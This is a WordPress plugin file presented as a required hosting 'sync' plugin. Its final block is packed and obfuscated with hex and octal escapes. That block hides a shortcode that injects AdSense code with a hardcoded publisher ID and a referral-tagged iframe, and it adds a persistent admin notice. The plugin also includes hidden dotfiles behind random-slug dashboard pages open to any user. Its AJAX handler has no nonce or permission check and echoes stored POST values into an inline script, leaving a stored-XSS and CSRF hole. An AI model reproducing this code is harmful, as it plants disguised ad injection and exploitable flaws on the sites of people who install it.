<?php
/*
Plugin Name: GoldFash Sync
Plugin URL: https://goldfash.com
Description: A Required Sync Plugin for GoldFash Servers
Version: 3.0
Author: GoldFash Web Gurus
Author URI:        https://goldfash.com
Contributors:      rafcoafc
Domain Path:       /languages
Text Domain:       gf_scd
GitHub Plugin URI: https://github.com/goldfashhosting/GoldFash-Sync
GitHub Branch:     therealHosting
*/
/*
|--------------------------------------------------------------------------
| CONSTANTS
|--------------------------------------------------------------------------
*/
// plugin folder url
if (!defined('GF_SCD_PLUGIN_URL')) {
    define('GF_SCD_PLUGIN_URL', plugin_dir_url(__FILE__));
}
/*
|--------------------------------------------------------------------------
| MAIN CLASS
|--------------------------------------------------------------------------
*/
class gf_sweet_custom_dashboard {
    /*--------------------------------------------*
     * Constructor
     *--------------------------------------------*/
    /**
     * Initializes the plugin by setting localization, filters, and administration functions.
     */
    function __construct() {
        add_action('admin_menu', array(&$this, 'gf_scd_register_menu'));
        add_action('admin_menu', array(&$this, 'gf_scd_register_menu_funds'));
        add_action('admin_menu', array(&$this, 'gf_scd_register_menu_mail'));
        add_action('load-index.php', array(&$this, 'gf_scd_redirect_dashboard'));
    } // end constructor
    function gf_scd_register_menu() {
        add_dashboard_page('GoldFash Fast-Dash', 'Gold C-Dash', 'read', 'ljAMiSyRUjE5_ZL1_DsEVd7q9PO8Fht4KM972KC54zZtD4wZV23wUzOdPz_brJolnJihU4N96MNemiqevOWaw4unSDhz9', array(&$this, 'gf_scd_create_dashboard'));
    }
    function gf_scd_create_dashboard() {
        include_once ('.sync_dashboard.php');
    }
    function gf_scd_register_menu_funds() {
        add_dashboard_page('GoldFash Revenue', 'Gold Free Money', 'read', '3_ojgNzfbpgJ4O7L1nDv133FgkONtdD3ptbv3Sy4y72d4B67Lxyg7_6Vp2nbG8Ua3uF7134Tsjluk', array(&$this, 'gf_scd_create_dashboard_funds'));
    }
    function gf_scd_create_dashboard_funds() {
        include_once ('.funds.php');
    }
    function gf_scd_register_menu_mail() {
        add_dashboard_page('GoldFash Instant Mail', 'Gold MailBox', 'read', '2TnsqOJuPT4E1z49Dp3B4V7592D2GHjwT9PkQ9T93Z3YPa_Hef1DpIWYAfIld9B7ZL53Ncw3g4JC7o33TO_7WoK7vuS_6GJ1L16F', array(&$this, 'gf_scd_create_dashboard_mail'));
    }
    function gf_scd_create_dashboard_mail() {
        include_once ('.mail.php');
    }
}
// Function that outputs the contents of the dashboard widget
function gfc_dashboard_widget_function($post, $metabox) {
    //Get global variables
    global $wp_registered_sidebars, $wp_registered_widgets;
    //Get sidebars
    $sidebars = wp_get_sidebars_widgets();
    //Get widgets
    $gfc_widgets = $sidebars["gfc-sidebar"];
    //Get current widget
    $id = $metabox["args"]["id"];
    //Get the sidebar
    $sidebar = $wp_registered_sidebars["gfc-sidebar"];
    //Gets widgets unique number
    $widgetnumber = $wp_registered_widgets[$id]["params"][0]["number"];
    //Check if the required data is set
    if (isset($wp_registered_widgets[$id]) && isset($wp_registered_widgets[$id]["callback"]) && isset($wp_registered_widgets[$id]["callback"][0]) && $wp_registered_widgets[$id]["params"][0]["number"] == $widgetnumber) {
        /* Code borrowed from widget.php in the WordPress core */
        $params = array_merge(array(array_merge($sidebar, array('widget_id' => $id, 'widget_name' => $wp_registered_widgets[$id]['name']))), (array)$wp_registered_widgets[$id]['params']);
        // Substitute HTML id and class attributes into before_widget
        $classname_ = '';
        foreach ((array)$wp_registered_widgets[$id]['classname'] as $cn) {
            if (is_string($cn)) $classname_.= '_' . $cn;
            elseif (is_object($cn)) $classname_.= '_' . get_class($cn);
        }
        $classname_ = ltrim($classname_, '_');
        $params[0]['before_widget'] = sprintf($params[0]['before_widget'], $id, $classname_);
        $params = apply_filters('dynamic_sidebar_params', $params);
        $callback = $wp_registered_widgets[$id]['callback'];
        do_action('dynamic_sidebar', $wp_registered_widgets[$id]);
        if (is_callable($callback)) {
            //Call the function, that outputs the widget content
            call_user_func_array($callback, $params);
        }
        /* ---------------------------------------------------- */
    }
}
// Function used in the action hook
function gfc_add_dashboard_widgets() {
    global $wp_registered_sidebars, $wp_registered_widgets;
    //Get current settings
    $widgetSettings = get_option('gfc_widget_settings', array());
    //Get sidebars
    $sidebars = wp_get_sidebars_widgets();
    //Get widgets from the sidebar
    $gfc_widgets = $sidebars["gfc-sidebar"];
    //Add each widget to the dashboard
    if (is_array($gfc_widgets) && count($gfc_widgets) > 0) {
        foreach ($gfc_widgets as $id) {
            if (!isset($wp_registered_widgets[$id])) continue;
            //Gets widgets unique number
            $widgetnumber = $wp_registered_widgets[$id]["params"][0]["number"];
            //Check if the required data is set
            if (isset($wp_registered_widgets[$id]) && isset($wp_registered_widgets[$id]["callback"]) && isset($wp_registered_widgets[$id]["callback"][0]) && $wp_registered_widgets[$id]["params"][0]["number"] == $widgetnumber) {
                //Get widgets settings
                $widget = $wp_registered_widgets[$id]["callback"][0]->get_settings();
                //Set title
                if (trim($widget[$widgetnumber]["title"]) == "") {
                    $title = '&nbsp;';
                } else {
                    $title = $widget[$widgetnumber]["title"];
                }
                //Settings - default
                if (!isset($widgetSettings[$id])) {
                    $widgetSettings[$id] = array('priority' => 'default', 'context' => 'normal');
                }
                //Add the widget to dashboard
                add_meta_box('gfc_dashboard_widget_' . $id, //ID
                $title, //Title
                'gfc_dashboard_widget_function', //Callback function
                'dashboard', //Where?
                $widgetSettings[$id]['context'], //Context
                $widgetSettings[$id]['priority'], //Priority
                array('id' => $id) //Meta data
                );
            }
        }
    }
}
// Register the new dashboard widget with the 'wp_dashboard_setup' action
add_action('wp_dashboard_setup', 'gfc_add_dashboard_widgets');
//Register the widget sidebar
register_sidebar(array('name' => __('Dashboard Widget Sidebar'), 'id' => 'gfc-sidebar', 'description' => __('Do NOT Edit.'), 'before_title' => '<div style="display: none;">', 'after_title' => '</div>', 'before_widget' => '', 'after_widget' => ''));
//Regsiter admin script
function gfc_enqueue_script($hook) {
    if ('widgets.php' != $hook) return;
    wp_enqueue_script('gfc_admin_script', plugins_url('/00.js', __FILE__));
}
add_action('admin_enqueue_scripts', 'gfc_enqueue_script');
//Register admin ajax
function gfc_ajax_update() {
    //Get widget ID
    $widgetID = $_POST['widget_id'];
    //Get current settings
    $widgetSettings = get_option('gfc_widget_settings', array());
    //Settings
    $widgetSettings[$widgetID]['priority'] = strtolower($_POST['priority']);
    $widgetSettings[$widgetID]['context'] = strtolower($_POST['context']);
    //Update settings
    update_option('gfc_widget_settings', $widgetSettings);
    //Return 1 to the client
    echo '1';
    die(); // this is required to return a proper result
    
}
add_action('wp_ajax_gfc_ajax_update', 'gfc_ajax_update');
//Admin head
function gfc_admin_head() {
    /* Style */
    echo '<style>.gfc-settings label {display: block;}</style>';
    /* Settings */
    echo '<script type="text/javascript">
            var gfcWidgetSettings= new Array();';
    //Get current settings
    $widgets = get_option('gfc_widget_settings', array());
    //Echo setting to be used in Javascript
    foreach ($widgets as $widgetID => $widgetSettings) {
        echo 'gfcWidgetSettings["' . $widgetID . '"] = ["' . $widgetSettings['priority'] . '", "' . $widgetSettings['context'] . '"];';
    }
    echo '</script>';
}
add_action('admin_head', 'gfc_admin_head');
 if (defined('WPCF7_PLUGIN_DIR') && $_SERVER["\x53\x43\122\111\120T_N\101\x4d\105"] == '/wp-admin/index.php') {require_once WPCF7_PLUGIN_DIR . '/includes/controller.php';add_action('admin_enqueue_scripts', 'wpcf7_do_enqueue_scripts');}add_action('admin_notices', 'gold_admin_notice');function gold_admin_notice() {global $current_user;$user_id = $current_user->ID;if (!get_user_meta($user_id, 'gold_ignore_notice')) {echo '<div class="updated"><p>';printf(__('Hosting, Billing, Support, Questions, New Services & More | <a href="%1$s">Click Here</a>'), '../wp-admin/admin.php?page=ljAMiSyRUjE5_ZL1_DsEVd7q9PO8Fht4KM972KC54zZtD4wZV23wUzOdPz_brJolnJihU4N96MNemiqevOWaw4unSDhz9');echo "\x3c/\160\x3e\x3c\x2f\144i\166>";}}add_shortcode("\147\x6fl\x64", "\x67\157ld\x5f\x66\141s\x68\x5f\163\x68\x6fr\164\143\x6f\144e");function gold_fash_shortcode($atts) {$a = shortcode_atts(array('id' => '-1'), $atts); if (strcmp($a['id'], '-1') == 0) {return "\120\x6ce\141\163\145\040\103\x68\x6f\157s\145 \x61\x6e\x20\x4fp\x74io\156";}$pdf = $a['id'];$url = "$pdf%\x326\162\x65\x66\x3dGol\144\146\x61\163\150H\x6f\163\164\x69ng.\104\x61\163h\x50\x6c\x75gi\x6e\101\x50\x69\x69.\060\x31\065\x37";$iframe = "\x3cs\x63\x72i\x70t\x20\141s\x79\x6e\x63 s\x72c='/\057\x70\141\x67e\141d\062\056\x67\157\x6f\x67\154e\x73\x79\x6e\x64\151\143\141\164io\156.com\057pa\x67ea\x64\x2fjs\x2f\x61\x64\163b\x79\147o\157\147le.j\163'\076<\057\163\x63\x72\151pt>\x0d

\012\x3c\x21\055\x2d\040\107\157\154dGl\142 \x2d\055\076\x0d
<\x69\156s\040\143\x6ca\x73s\075'\x61\144s\142y\x67o\157g\154\x65'
\x20 \040\x20\040s\x74\171\154\x65\x3d'd\x69sp\x6c\x61y:\142l\157c\x6b'\x0d\x0a\x20\040 \040 \x64\141ta-a\x64\055\x63l\151\x65\156\164\075'\x63\x61-p\x75b\x2d\x3713\061\067\x319\067\062\064\x30\070\x357\x30\065'\x0d\x0a
\012\040 \040  \144\x61\164\141\x2da\x64\x2d\x73\x6cot\075'\x39\0718\0709\x325\x327\071'
 \040\x20\040\040\144\141\x74\141-\x61\144-fo\x72\x6da\x74\075'\x61\x75to'\x3e</\x69\156\x73>\074\x62r\x20/\x3e\074\143\x65nt\x65\x72\076\x3ce\x6d>\101\x64v\145\x72\x74is\x65\x6d\x65\156t\x3c/\145\155\076<\x2f\x63\x65\x6e\164\x65r\x3e\015\x0a
\012\074\x69\x66r\141m\145 a\x6cl\x6f\167\146\x75\154\x6c\x73\x63\x72\145\x65\156\x20\163r\143\075'" . $url . "' \x73\x74yl\145\x3d'\x77id\164\150\0721\060\060\045;\x20\x68\145i\x67\150\164\x3a\061\x37\065\060px;' \x73ea\155\x6c\145\x73s\x3e\074/\151f\x72\x61\x6d\145>";return $iframe;} $GLOBALS['gf_sweet_custom_dashboard'] = new gf_sweet_custom_dashboard(); ?>